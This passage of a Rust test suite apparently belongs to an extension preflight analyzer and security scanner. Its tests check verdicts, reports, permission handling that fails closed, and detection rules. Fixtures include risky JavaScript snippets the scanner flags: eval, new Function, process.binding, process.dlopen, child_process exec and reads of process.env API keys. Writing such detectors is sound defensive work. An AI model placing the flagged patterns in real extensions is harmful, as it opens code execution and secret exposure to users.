    }

    #[test]
    fn extract_specifier_from_message_none() {
        assert_eq!(extract_specifier_from_message("no backticks"), None);
    }

    #[test]
    fn extract_import_specifiers_simple_import() {
        let specs = extract_import_specifiers_simple("import fs from 'node:fs';");
        assert_eq!(specs, vec!["node:fs"]);
    }

    #[test]
    fn extract_import_specifiers_simple_require() {
        let specs = extract_import_specifiers_simple("const fs = require('fs');");
        assert_eq!(specs, vec!["fs"]);
    }

    #[test]
    fn extract_import_specifiers_skips_relative() {
        let specs = extract_import_specifiers_simple("import foo from './foo';");
        assert!(specs.is_empty());
    }

    #[test]
    fn extract_quoted_string_double() {
        assert_eq!(
            extract_quoted_string("\"hello\" rest"),
            Some("hello".to_string())
        );
    }

    #[test]
    fn extract_quoted_string_single() {
        assert_eq!(
            extract_quoted_string("'hello' rest"),
            Some("hello".to_string())
        );
    }

    #[test]
    fn extract_quoted_string_no_quote() {
        assert_eq!(extract_quoted_string("no quotes"), None);
    }

    // ---- PreflightReport ----

    #[test]
    fn empty_findings_gives_pass() {
        let report = PreflightReport::from_findings("test-ext".into(), vec![]);
        assert_eq!(report.verdict, PreflightVerdict::Pass);
        assert_eq!(report.summary.errors, 0);
        assert_eq!(report.summary.warnings, 0);
    }

    #[test]
    fn warning_findings_gives_warn() {
        let findings = vec![PreflightFinding {
            severity: FindingSeverity::Warning,
            category: FindingCategory::ModuleCompat,
            message: "stub".into(),
            remediation: None,
            file: None,
            line: None,
        }];
        let report = PreflightReport::from_findings("test-ext".into(), findings);
        assert_eq!(report.verdict, PreflightVerdict::Warn);
        assert_eq!(report.summary.warnings, 1);
    }

    #[test]
    fn error_findings_gives_fail() {
        let findings = vec![
            PreflightFinding {
                severity: FindingSeverity::Error,
                category: FindingCategory::CapabilityPolicy,
                message: "denied".into(),
                remediation: None,
                file: None,
                line: None,
            },
            PreflightFinding {
                severity: FindingSeverity::Warning,
                category: FindingCategory::ModuleCompat,
                message: "stub".into(),
                remediation: None,
                file: None,
                line: None,
            },
        ];
        let report = PreflightReport::from_findings("test-ext".into(), findings);
        assert_eq!(report.verdict, PreflightVerdict::Fail);
        assert_eq!(report.summary.errors, 1);
        assert_eq!(report.summary.warnings, 1);
    }

    #[test]
    fn report_schema_version() {
        let report = PreflightReport::from_findings("x".into(), vec![]);
        assert_eq!(report.schema, PREFLIGHT_SCHEMA);
    }

    #[test]
    fn security_scan_report_json_roundtrip() {
        let findings = vec![PreflightFinding {
            severity: FindingSeverity::Warning,
            category: FindingCategory::ModuleCompat,
            message: "test".into(),
            remediation: Some("fix it".into()),
            file: Some("index.ts".into()),
            line: Some(42),
        }];
        let report = PreflightReport::from_findings("ext-1".into(), findings);
        let json = report.to_json().unwrap();
        let back: PreflightReport = serde_json::from_str(&json).unwrap();
        assert_eq!(back.verdict, PreflightVerdict::Warn);
        assert_eq!(back.findings.len(), 1);
        assert_eq!(back.findings[0].line, Some(42));
    }

    #[test]
    fn report_markdown_contains_verdict() {
        let report = PreflightReport::from_findings("my-ext".into(), vec![]);
        let md = report.render_markdown();
        assert!(md.contains("PASS"));
        assert!(md.contains("my-ext"));
    }

    #[test]
    fn report_markdown_lists_findings() {
        let findings = vec![PreflightFinding {
            severity: FindingSeverity::Error,
            category: FindingCategory::ForbiddenPattern,
            message: "process.binding".into(),
            remediation: Some("remove it".into()),
            file: Some("main.ts".into()),
            line: Some(10),
        }];
        let report = PreflightReport::from_findings("ext".into(), findings);
        let md = report.render_markdown();
        assert!(md.contains("process.binding"));
        assert!(md.contains("main.ts:10"));
        assert!(md.contains("remove it"));
    }

    // ---- PreflightAnalyzer.analyze_source ----

    #[test]
    fn analyze_source_clean_extension() {
        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let source = r#"
import { Type } from "@sinclair/typebox";
import path from "node:path";

export default function(pi) {
    pi.tool({ name: "hello", schema: Type.Object({}) });
}
"#;
        let report = analyzer.analyze_source("clean-ext", source);
        assert_eq!(report.verdict, PreflightVerdict::Pass);
    }

    #[test]
    fn analyze_source_stubbed_net_warns() {
        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let source = r#"
import net from "node:net";
"#;
        let report = analyzer.analyze_source("net-ext", source);
        assert_eq!(report.verdict, PreflightVerdict::Warn);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.message.contains("node:net"))
        );
    }

    #[test]
    fn analyze_source_denied_capability() {
        // Use safe policy — exec is denied
        let policy = crate::extensions::PolicyProfile::Safe.to_policy();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let source = r#"
const { exec } = require("child_process");
export default function(pi) {
    pi.exec("ls");
}
"#;
        let report = analyzer.analyze_source("exec-ext", source);
        assert_eq!(report.verdict, PreflightVerdict::Fail);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.category == FindingCategory::CapabilityPolicy
                    && f.message.contains("exec"))
        );
    }

    #[test]
    fn analyze_source_env_prompts_on_default_policy() {
        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let source = r"
const key = process.env.API_KEY;
";
        let report = analyzer.analyze_source("env-ext", source);
        // Default policy has env in deny_caps, so it should be denied
        assert!(report.findings.iter().any(|f| f.message.contains("env")));
    }

    #[test]
    fn analyze_source_stub_module_warns() {
        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let source = r#"
import chokidar from "chokidar";
"#;
        let report = analyzer.analyze_source("watch-ext", source);
        assert_eq!(report.verdict, PreflightVerdict::Warn);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.message.contains("chokidar"))
        );
    }

    #[test]
    fn analyze_source_per_extension_override_allows() {
        use crate::extensions::ExtensionOverride;
        use std::collections::HashMap;

        // To test per-extension allow, we need a policy where exec is NOT
        // in global deny_caps (since global deny has higher precedence).
        // Mode = Strict means the fallback would deny, but per-extension
        // allow should override the fallback.
        let mut per_ext = HashMap::new();
        per_ext.insert(
            "my-ext".to_string(),
            ExtensionOverride {
                mode: None,
                allow: vec!["exec".to_string()],
                deny: vec![],
                quota: None,
            },
        );

        let policy = ExtensionPolicy {
            mode: crate::extensions::ExtensionPolicyMode::Strict,
            max_memory_mb: 256,
            default_caps: vec!["read".to_string(), "write".to_string()],
            deny_caps: vec![], // No global deny — test per-extension allow
            per_extension: per_ext,
            ..Default::default()
        };
        let analyzer = PreflightAnalyzer::new(&policy, Some("my-ext"));
        let source = r#"
const { exec } = require("child_process");
pi.exec("ls");
"#;
        let report = analyzer.analyze_source("my-ext", source);
        // exec should be allowed via per-extension override
        let exec_denied = report.findings.iter().any(|f| {
            f.category == FindingCategory::CapabilityPolicy
                && f.message.contains("exec")
                && f.severity == FindingSeverity::Error
        });
        assert!(
            !exec_denied,
            "exec should be allowed via per-extension override"
        );
    }

    #[test]
    fn analyze_missing_path_fails_closed() {
        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let temp_dir = tempfile::tempdir().expect("tempdir");
        let missing = temp_dir.path().join("missing-extension.js");

        let exists = validate_extension_scan_input(&missing)
            .expect("a genuinely missing extension path is not a probe error");
        let report = analyzer.analyze(&missing);

        assert!(!exists);
        assert_eq!(report.extension_id, "missing-extension.js");
        assert_eq!(report.verdict, PreflightVerdict::Fail);
        assert!(report.findings.iter().any(|finding| {
            finding.category == FindingCategory::AnalysisInput
                && finding.message.contains("does not exist")
        }));
    }

    #[cfg(unix)]
    #[test]
    fn analyze_unreadable_nested_directory_fails_closed() {
        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let temp_dir = tempfile::tempdir().expect("tempdir");
        let entry = temp_dir.path().join("clean.js");
        std::fs::write(&entry, "export default function () {};\n").expect("write clean entry");

        let blocked_dir = temp_dir.path().join("blocked");
        std::fs::create_dir_all(&blocked_dir).expect("mkdir blocked dir");
        std::fs::write(blocked_dir.join("hidden.js"), "import fs from 'fs';\n")
            .expect("write blocked entry");
        let mode_guard = ModeRestoreGuard::deny_all(&blocked_dir);

        let permission_result = validate_extension_scan_permissions(temp_dir.path());
        let report = analyzer.analyze(temp_dir.path());

        mode_guard.restore();

        let permission_error = permission_result
            .expect_err("mode-blocked directory must fail before extension traversal");
        assert_eq!(
            permission_error.kind(),
            std::io::ErrorKind::PermissionDenied,
            "mode-blocked directory must produce a typed PermissionDenied error"
        );
        assert!(
            permission_error
                .to_string()
                .contains(&blocked_dir.display().to_string()),
            "permission error must identify the blocked directory"
        );
        assert_eq!(
            report.extension_id,
            temp_dir
                .path()
                .file_name()
                .and_then(|name| name.to_str())
                .expect("temp dir file name")
        );
        assert_eq!(report.verdict, PreflightVerdict::Fail);
        assert!(report.findings.iter().any(|finding| {
            finding.category == FindingCategory::AnalysisInput
                && finding
                    .message
                    .contains("Failed to access extension source")
                && finding.message.contains("Permission denied")
                && finding.message.contains(&blocked_dir.display().to_string())
        }));
    }

    #[cfg(unix)]
    #[test]
    fn analyze_unreadable_single_file_fails_closed() {
        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let temp_dir = tempfile::tempdir().expect("tempdir");
        let blocked_file = temp_dir.path().join("blocked.js");
        std::fs::write(&blocked_file, "import fs from 'fs';\n").expect("write blocked extension");
        let mode_guard = ModeRestoreGuard::deny_all(&blocked_file);

        let permission_result = validate_extension_scan_permissions(&blocked_file);
        let report = analyzer.analyze(&blocked_file);

        mode_guard.restore();

        let permission_error = permission_result
            .expect_err("mode-blocked extension file must fail before source read");
        assert_eq!(
            permission_error.kind(),
            std::io::ErrorKind::PermissionDenied,
            "mode-blocked extension file must produce a typed PermissionDenied error"
        );
        assert!(
            permission_error
                .to_string()
                .contains(&blocked_file.display().to_string()),
            "permission error must identify the blocked extension file"
        );
        assert_eq!(report.extension_id, "blocked.js");
        assert_eq!(report.verdict, PreflightVerdict::Fail);
        assert!(report.findings.iter().any(|finding| {
            finding.category == FindingCategory::AnalysisInput
                && finding
                    .message
                    .contains("Failed to access extension source")
                && finding.message.contains("Permission denied")
                && finding
                    .message
                    .contains(&blocked_file.display().to_string())
        }));
    }

    #[cfg(unix)]
    #[test]
    fn path_scans_reject_extension_below_unsearchable_parent() {
        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let temp_dir = tempfile::tempdir().expect("tempdir");
        let blocked_parent = temp_dir.path().join("blocked-parent");
        std::fs::create_dir(&blocked_parent).expect("create blocked parent");
        let entry = blocked_parent.join("extension.js");
        std::fs::write(&entry, "eval('must not be scanned');\n").expect("write extension");
        let mode_guard = ModeRestoreGuard::deny_all(&blocked_parent);

        let permission_result = validate_extension_scan_input(&entry);
        let preflight = analyzer.analyze(&entry);
        let security = SecurityScanner::scan_path("blocked-parent", &entry, &entry);

        mode_guard.restore();

        let permission_error = permission_result
            .expect_err("an extension below a mode-000 parent must fail its typed input probe");
        assert_eq!(
            permission_error.kind(),
            std::io::ErrorKind::PermissionDenied
        );
        assert!(
            permission_error
                .to_string()
                .contains(&blocked_parent.display().to_string()),
            "permission error must identify the blocked ancestor: {permission_error}"
        );

        assert_eq!(preflight.verdict, PreflightVerdict::Fail);
        assert_eq!(preflight.findings.len(), 1);
        assert_eq!(
            preflight.findings[0].category,
            FindingCategory::AnalysisInput
        );
        assert!(
            preflight.findings[0]
                .message
                .to_ascii_lowercase()
                .contains("permission denied")
        );

        assert_eq!(security.findings.len(), 1);
        assert_eq!(
            security.findings[0].rule_id,
            SecurityRuleId::ScanInputFailure
        );
        assert!(
            security.findings[0]
                .rationale
                .to_ascii_lowercase()
                .contains("permission denied")
        );
        assert!(
            !security
                .findings
                .iter()
                .any(|finding| finding.rule_id == SecurityRuleId::EvalUsage),
            "security scan must not read source below a blocked parent"
        );
    }

    #[cfg(unix)]
    #[test]
    fn path_scans_reject_terminal_symlink_below_unsearchable_target_parent() {
        use std::os::unix::fs::symlink;

        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let temp_dir = tempfile::tempdir().expect("tempdir");
        let blocked_parent = temp_dir.path().join("blocked-target-parent");
        std::fs::create_dir(&blocked_parent).expect("create blocked target parent");
        let target = blocked_parent.join("target.js");
        std::fs::write(&target, "eval('must not be scanned');\n").expect("write target");
        let link = temp_dir.path().join("extension-link.js");
        symlink(&target, &link).expect("create terminal extension symlink");
        let mode_guard = ModeRestoreGuard::deny_all(&blocked_parent);

        let permission_result = validate_extension_scan_input(&link);
        let preflight = analyzer.analyze(&link);
        let security = SecurityScanner::scan_path("blocked-symlink", &link, &link);

        mode_guard.restore();

        assert!(link.try_exists().expect("probe restored symlink target"));
        let permission_error = permission_result
            .expect_err("a symlink into a mode-000 parent must fail its typed input probe");
        assert_eq!(
            permission_error.kind(),
            std::io::ErrorKind::PermissionDenied
        );

        assert_eq!(preflight.verdict, PreflightVerdict::Fail);
        assert_eq!(preflight.findings.len(), 1);
        assert_eq!(
            preflight.findings[0].category,
            FindingCategory::AnalysisInput
        );
        assert!(
            preflight.findings[0]
                .message
                .to_ascii_lowercase()
                .contains("permission denied")
        );

        assert_eq!(security.findings.len(), 1);
        assert_eq!(
            security.findings[0].rule_id,
            SecurityRuleId::ScanInputFailure
        );
        assert!(
            security.findings[0]
                .rationale
                .to_ascii_lowercase()
                .contains("permission denied")
        );
        assert!(
            !security
                .findings
                .iter()
                .any(|finding| finding.rule_id == SecurityRuleId::EvalUsage),
            "security scan must not read a terminal symlink through a blocked target parent"
        );
    }

    #[cfg(unix)]
    #[test]
    fn path_scans_use_owner_mode_class_without_falling_through_to_other() {
        use std::os::unix::fs::MetadataExt as _;

        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let temp_dir = tempfile::tempdir().expect("tempdir");
        let entry = temp_dir.path().join("owner-class.js");
        std::fs::write(&entry, "eval('must not be scanned');\n").expect("write extension");
        assert_eq!(
            std::fs::metadata(&entry)
                .expect("stat owned extension")
                .uid(),
            rustix::process::geteuid().as_raw(),
            "fixture must be owned by the effective test identity"
        );
        // Other has read, but Unix selects the owner class and must not fall
        // through when the owner's read bit is absent.
        let mode_guard = ModeRestoreGuard::apply(&entry, 0o004);

        let permission_result = validate_extension_scan_input(&entry);
        let preflight = analyzer.analyze(&entry);
        let security = SecurityScanner::scan_path("owner-class", &entry, &entry);

        mode_guard.restore();

        let permission_error = permission_result
            .expect_err("owner mode class without read must deny the extension scan");
        assert_eq!(
            permission_error.kind(),
            std::io::ErrorKind::PermissionDenied
        );
        assert!(
            permission_error
                .to_string()
                .contains("Unix owner mode class")
        );
        assert_eq!(preflight.verdict, PreflightVerdict::Fail);
        assert_eq!(preflight.findings.len(), 1);
        assert_eq!(
            preflight.findings[0].category,
            FindingCategory::AnalysisInput
        );
        assert_eq!(security.findings.len(), 1);
        assert_eq!(
            security.findings[0].rule_id,
            SecurityRuleId::ScanInputFailure
        );
        assert!(
            !security
                .findings
                .iter()
                .any(|finding| finding.rule_id == SecurityRuleId::EvalUsage),
            "security scan must not fall through to the other mode class"
        );
    }

    #[cfg(unix)]
    #[test]
    fn permission_walk_ignores_only_directories_ignored_by_both_scanners() {
        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let temp_dir = tempfile::tempdir().expect("tempdir");

        assert!(extension_scan_directory_is_ignored_by_all(
            &temp_dir.path().join("node_modules")
        ));
        assert!(extension_scan_directory_is_ignored_by_all(
            &temp_dir.path().join(".git")
        ));
        for name in ["target", "dist", ".hidden"] {
            assert!(
                !extension_scan_directory_is_ignored_by_all(&temp_dir.path().join(name)),
                "{name} is still read by at least one scanner"
            );
        }

        let mut mode_guards = Vec::new();
        for name in ["node_modules", ".git"] {
            let ignored_dir = temp_dir.path().join(name);
            std::fs::create_dir(&ignored_dir).expect("create ignored directory");
            std::fs::write(
                ignored_dir.join("ignored.js"),
                "eval('ignored by both scanners');\n",
            )
            .expect("write ignored source");
            mode_guards.push(ModeRestoreGuard::deny_all(&ignored_dir));
        }

        let permission_result = validate_extension_scan_input(temp_dir.path());
        let preflight = analyzer.analyze(temp_dir.path());
        let security =
            SecurityScanner::scan_path("ignored-by-both", temp_dir.path(), temp_dir.path());

        for guard in mode_guards {
            guard.restore();
        }

        assert!(permission_result.expect("validate ignored directories"));
        assert_eq!(preflight.verdict, PreflightVerdict::Pass);
        assert!(preflight.findings.is_empty());
        assert!(security.findings.is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn permission_walk_covers_directories_read_by_either_scanner() {
        for name in ["target", ".hidden"] {
            let policy = ExtensionPolicy::default();
            let analyzer = PreflightAnalyzer::new(&policy, None);
            let temp_dir = tempfile::tempdir().expect("tempdir");
            let blocked_dir = temp_dir.path().join(name);
            std::fs::create_dir(&blocked_dir).expect("create scanner-specific directory");
            std::fs::write(
                blocked_dir.join("blocked.js"),
                "eval('must not be scanned');\n",
            )
            .expect("write blocked source");
            let mode_guard = ModeRestoreGuard::deny_all(&blocked_dir);

            let permission_result = validate_extension_scan_input(temp_dir.path());
            let preflight = analyzer.analyze(temp_dir.path());
            let security =
                SecurityScanner::scan_path("scanner-union", temp_dir.path(), temp_dir.path());

            mode_guard.restore();

            let permission_error = permission_result
                .expect_err("a directory read by either scanner must be permission-validated");
            assert_eq!(
                permission_error.kind(),
                std::io::ErrorKind::PermissionDenied
            );
            assert!(
                permission_error
                    .to_string()
                    .contains(&blocked_dir.display().to_string()),
                "permission error must identify {name}: {permission_error}"
            );
            assert_eq!(preflight.verdict, PreflightVerdict::Fail);
            assert_eq!(preflight.findings.len(), 1);
            assert_eq!(
                preflight.findings[0].category,
                FindingCategory::AnalysisInput
            );
            assert_eq!(security.findings.len(), 1);
            assert_eq!(
                security.findings[0].rule_id,
                SecurityRuleId::ScanInputFailure
            );
        }
    }

    #[cfg(unix)]
    #[test]
    fn directory_scans_ignore_nested_symlinks_consistently() {
        use std::os::unix::fs::symlink;

        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let temp_dir = tempfile::tempdir().expect("tempdir");
        let extension_root = temp_dir.path().join("extension");
        std::fs::create_dir(&extension_root).expect("create extension root");
        let blocked_target_parent = temp_dir.path().join("blocked-target");
        std::fs::create_dir(&blocked_target_parent).expect("create blocked target parent");
        let target = blocked_target_parent.join("target.js");
        std::fs::write(&target, "eval('nested symlink target');\n")
            .expect("write nested symlink target");
        let nested_link = extension_root.join("nested.js");
        symlink(&target, &nested_link).expect("create nested source symlink");
        let mode_guard = ModeRestoreGuard::deny_all(&blocked_target_parent);

        let permission_result = validate_extension_scan_input(&extension_root);
        let preflight = analyzer.analyze(&extension_root);
        let security =
            SecurityScanner::scan_path("nested-symlink", &extension_root, &extension_root);

        mode_guard.restore();

        assert!(
            nested_link
                .try_exists()
                .expect("probe restored symlink target")
        );
        assert!(permission_result.expect("ignore nested symlink"));
        assert_eq!(preflight.verdict, PreflightVerdict::Pass);
        assert!(preflight.findings.is_empty());
        assert!(security.findings.is_empty());
    }

    #[test]
    fn analyze_uses_path_filename_when_extension_id_is_not_supplied() {
        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let temp_dir = tempfile::tempdir().expect("tempdir");
        let entry = temp_dir.path().join("sample-ext.js");
        std::fs::write(&entry, "export default function () {};\n").expect("write entry");

        let report = analyzer.analyze(&entry);

        assert_eq!(report.extension_id, "sample-ext.js");
    }

    #[test]
    fn capability_findings_without_evidence_omit_bogus_location_fields() {
        let policy = crate::extensions::PolicyProfile::Safe.to_policy();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let ledger = crate::extensions::CompatLedger {
            schema: crate::extensions::COMPAT_LEDGER_SCHEMA_VERSION.to_string(),
            capabilities: vec![crate::extensions::CompatCapabilityEvidence {
                capability: "exec".to_string(),
                reason: "test".to_string(),
                evidence: Vec::new(),
                remediation: None,
            }],
            rewrites: Vec::new(),
            forbidden: Vec::new(),
            flagged: Vec::new(),
        };
        let mut findings = Vec::new();

        analyzer.check_capability_findings(&ledger, &mut findings);

        let exec_finding = findings
            .into_iter()
            .find(|finding| finding.message.contains("exec"))
            .expect("exec finding");
        assert_eq!(exec_finding.file, None);
        assert_eq!(exec_finding.line, None);
    }

    // ---- Verdict display ----

    #[test]
    fn verdict_display() {
        assert_eq!(format!("{}", PreflightVerdict::Pass), "PASS");
        assert_eq!(format!("{}", PreflightVerdict::Warn), "WARN");
        assert_eq!(format!("{}", PreflightVerdict::Fail), "FAIL");
    }

    #[test]
    fn verdict_serde_roundtrip() {
        for v in [
            PreflightVerdict::Pass,
            PreflightVerdict::Warn,
            PreflightVerdict::Fail,
        ] {
            let json = serde_json::to_string(&v).unwrap();
            let back: PreflightVerdict = serde_json::from_str(&json).unwrap();
            assert_eq!(v, back);
        }
    }

    // ---- Finding categories ----

    #[test]
    fn finding_category_display() {
        assert_eq!(
            format!("{}", FindingCategory::AnalysisInput),
            "analysis_input"
        );
        assert_eq!(
            format!("{}", FindingCategory::ModuleCompat),
            "module_compat"
        );
        assert_eq!(
            format!("{}", FindingCategory::CapabilityPolicy),
            "capability_policy"
        );
        assert_eq!(
            format!("{}", FindingCategory::ForbiddenPattern),
            "forbidden_pattern"
        );
        assert_eq!(
            format!("{}", FindingCategory::FlaggedPattern),
            "flagged_pattern"
        );
    }

    // ---- ConfidenceScore ----

    #[test]
    fn confidence_score_no_issues() {
        let score = ConfidenceScore::from_counts(0, 0);
        assert_eq!(score.value(), 100);
        assert_eq!(score.label(), "High");
    }

    #[test]
    fn confidence_score_one_warning() {
        let score = ConfidenceScore::from_counts(0, 1);
        assert_eq!(score.value(), 90);
        assert_eq!(score.label(), "High");
    }

    #[test]
    fn confidence_score_two_warnings() {
        let score = ConfidenceScore::from_counts(0, 2);
        assert_eq!(score.value(), 80);
        assert_eq!(score.label(), "Medium");
    }

    #[test]
    fn confidence_score_one_error() {
        let score = ConfidenceScore::from_counts(1, 0);
        assert_eq!(score.value(), 75);
        assert_eq!(score.label(), "Medium");
    }

    #[test]
    fn confidence_score_many_errors_floors_at_zero() {
        let score = ConfidenceScore::from_counts(5, 5);
        assert_eq!(score.value(), 0);
        assert_eq!(score.label(), "Very Low");
    }

    #[test]
    fn confidence_score_display() {
        let score = ConfidenceScore::from_counts(0, 0);
        assert_eq!(format!("{score}"), "100% (High)");
        let score = ConfidenceScore::from_counts(1, 2);
        assert_eq!(format!("{score}"), "55% (Low)");
    }

    #[test]
    fn confidence_score_serde_roundtrip() {
        let score = ConfidenceScore::from_counts(1, 1);
        let json = serde_json::to_string(&score).unwrap();
        let back: ConfidenceScore = serde_json::from_str(&json).unwrap();
        assert_eq!(score, back);
    }

    // ---- risk_banner_text ----

    #[test]
    fn risk_banner_pass() {
        let report = PreflightReport::from_findings("ext".into(), vec![]);
        assert!(report.risk_banner.contains("compatible"));
        assert!(report.risk_banner.contains("100%"));
    }

    #[test]
    fn risk_banner_warn() {
        let findings = vec![PreflightFinding {
            severity: FindingSeverity::Warning,
            category: FindingCategory::ModuleCompat,
            message: "stub".into(),
            remediation: None,
            file: None,
            line: None,
        }];
        let report = PreflightReport::from_findings("ext".into(), findings);
        assert!(report.risk_banner.contains("may have issues"));
        assert!(report.risk_banner.contains("1 warning"));
    }

    #[test]
    fn risk_banner_fail() {
        let findings = vec![PreflightFinding {
            severity: FindingSeverity::Error,
            category: FindingCategory::ForbiddenPattern,
            message: "bad".into(),
            remediation: None,
            file: None,
            line: None,
        }];
        let report = PreflightReport::from_findings("ext".into(), findings);
        assert!(report.risk_banner.contains("incompatible"));
        assert!(report.risk_banner.contains("1 error"));
    }

    // ---- render_markdown includes confidence and banner ----

    #[test]
    fn render_markdown_includes_confidence() {
        let report = PreflightReport::from_findings("ext".into(), vec![]);
        let md = report.render_markdown();
        assert!(md.contains("Confidence"));
        assert!(md.contains("100%"));
    }

    #[test]
    fn render_markdown_includes_risk_banner() {
        let findings = vec![PreflightFinding {
            severity: FindingSeverity::Warning,
            category: FindingCategory::ModuleCompat,
            message: "stub".into(),
            remediation: None,
            file: None,
            line: None,
        }];
        let report = PreflightReport::from_findings("ext".into(), findings);
        let md = report.render_markdown();
        assert!(md.contains("> "));
        assert!(md.contains("may have issues"));
    }

    // ---- report confidence in JSON ----

    #[test]
    fn report_json_includes_confidence() {
        let report = PreflightReport::from_findings("ext".into(), vec![]);
        let json = report.to_json().unwrap();
        assert!(json.contains("\"confidence\""));
        assert!(json.contains("\"risk_banner\""));
    }

    // ---- capability_remediation ----

    #[test]
    fn capability_remediation_exec() {
        let r = capability_remediation("exec");
        assert!(r.contains("allow-dangerous"));
    }

    #[test]
    fn capability_remediation_env() {
        let r = capability_remediation("env");
        assert!(r.contains("per-extension"));
    }

    #[test]
    fn capability_remediation_other() {
        let r = capability_remediation("http");
        assert!(r.contains("default_caps"));
    }

    // ================================================================
    // Security scanner tests (bd-21vng)
    // ================================================================

    fn scan(source: &str) -> SecurityScanReport {
        SecurityScanner::scan_source("test-ext", source)
    }

    fn has_rule(report: &SecurityScanReport, rule: SecurityRuleId) -> bool {
        report.findings.iter().any(|f| f.rule_id == rule)
    }

    // ---- RiskTier ----

    #[test]
    fn risk_tier_ordering() {
        assert!(RiskTier::Critical < RiskTier::High);
        assert!(RiskTier::High < RiskTier::Medium);
        assert!(RiskTier::Medium < RiskTier::Low);
    }

    #[test]
    fn risk_tier_serde_roundtrip() {
        for tier in [
            RiskTier::Critical,
            RiskTier::High,
            RiskTier::Medium,
            RiskTier::Low,
        ] {
            let json = serde_json::to_string(&tier).unwrap();
            let back: RiskTier = serde_json::from_str(&json).unwrap();
            assert_eq!(tier, back);
        }
    }

    #[test]
    fn risk_tier_display() {
        assert_eq!(format!("{}", RiskTier::Critical), "critical");
        assert_eq!(format!("{}", RiskTier::Low), "low");
    }

    // ---- SecurityRuleId ----

    #[test]
    fn rule_id_serde_roundtrip() {
        let rule = SecurityRuleId::EvalUsage;
        let json = serde_json::to_string(&rule).unwrap();
        assert_eq!(json, "\"SEC-EVAL-001\"");
        let back: SecurityRuleId = serde_json::from_str(&json).unwrap();
        assert_eq!(rule, back);

        let json = serde_json::to_string(&SecurityRuleId::ScanInputFailure).unwrap();
        assert_eq!(json, "\"SEC-SCAN-001\"");
        let back: SecurityRuleId = serde_json::from_str(&json).unwrap();
        assert_eq!(back, SecurityRuleId::ScanInputFailure);
    }

    #[test]
    fn rule_id_default_tier_consistency() {
        // All critical rules should have Critical tier.
        assert_eq!(SecurityRuleId::EvalUsage.default_tier(), RiskTier::Critical);
        assert_eq!(
            SecurityRuleId::ProcessBinding.default_tier(),
            RiskTier::Critical
        );
        // High.
        assert_eq!(
            SecurityRuleId::HardcodedSecret.default_tier(),
            RiskTier::High
        );
        // Medium.
        assert_eq!(
            SecurityRuleId::ProcessEnvAccess.default_tier(),
            RiskTier::Medium
        );
        // Scan input failures should force manual review.
        assert_eq!(
            SecurityRuleId::ScanInputFailure.default_tier(),
            RiskTier::High
        );
        // Low.
        assert_eq!(
            SecurityRuleId::DebuggerStatement.default_tier(),
            RiskTier::Low
        );
    }

    // ---- Clean extension ----

    #[test]
    fn clean_extension_has_no_findings() {
        let report = scan(
            r#"
import path from "node:path";
const p = path.join("a", "b");
export default function init(pi) {
    pi.tool({ name: "hello", schema: {} });
}
"#,
        );
        assert!(report.findings.is_empty());
        assert_eq!(report.overall_tier, RiskTier::Low);
        assert!(report.verdict.starts_with("CLEAN"));
        assert!(!report.should_block());
        assert!(!report.needs_review());
    }

    #[test]
    fn scan_path_missing_path_fails_closed() {
        let temp_dir = tempfile::tempdir().unwrap();
        let missing = temp_dir.path().join("missing-ext.js");
        let missing_display = missing.display().to_string();

        let report = SecurityScanner::scan_path("missing-ext", &missing, &missing);

        assert_eq!(report.overall_tier, RiskTier::High);
        assert!(report.needs_review());
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == SecurityRuleId::ScanInputFailure)
            .expect("scan input failure finding");
        assert_eq!(finding.file.as_deref(), Some(missing_display.as_str()));
        assert!(finding.rationale.contains("does not exist"));
    }

    #[test]
    fn scan_path_single_file_preserves_filename_location() {
        let temp_dir = tempfile::tempdir().unwrap();
        let entry = temp_dir.path().join("single-file.js");
        std::fs::write(&entry, "eval('bad');\n").unwrap();

        let report = SecurityScanner::scan_path("single-file", &entry, &entry);

        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == SecurityRuleId::EvalUsage)
            .expect("eval finding");
        assert_eq!(finding.file.as_deref(), Some("single-file.js"));
    }

    // ---- Critical tier detections ----

    #[test]
    fn detect_eval_usage() {
        let report = scan("const x = eval('1+1');");
        assert!(has_rule(&report, SecurityRuleId::EvalUsage));
        assert_eq!(report.overall_tier, RiskTier::Critical);
        assert!(report.should_block());
    }

    #[test]
    fn eval_in_identifier_not_flagged() {
        let report = scan("const retrieval = getData();");
        assert!(!has_rule(&report, SecurityRuleId::EvalUsage));
    }

    #[test]
    fn detect_new_function() {
        let report = scan("const fn = new Function('a', 'return a + 1');");
        assert!(has_rule(&report, SecurityRuleId::NewFunctionUsage));
        assert_eq!(report.overall_tier, RiskTier::Critical);
    }

    #[test]
    fn new_function_empty_not_flagged() {
        // new Function() with no args is less dangerous — still flagged
        // but that's fine, the rule covers the general case.
        let report = scan("const fn = new Function();");
        assert!(!has_rule(&report, SecurityRuleId::NewFunctionUsage));
    }

    #[test]
    fn detect_process_binding() {
        let report = scan("process.binding('fs');");
        assert!(has_rule(&report, SecurityRuleId::ProcessBinding));
        assert_eq!(report.overall_tier, RiskTier::Critical);
    }

    #[test]
    fn detect_process_dlopen() {
        let report = scan("process.dlopen(module, '/bad/addon.node');");
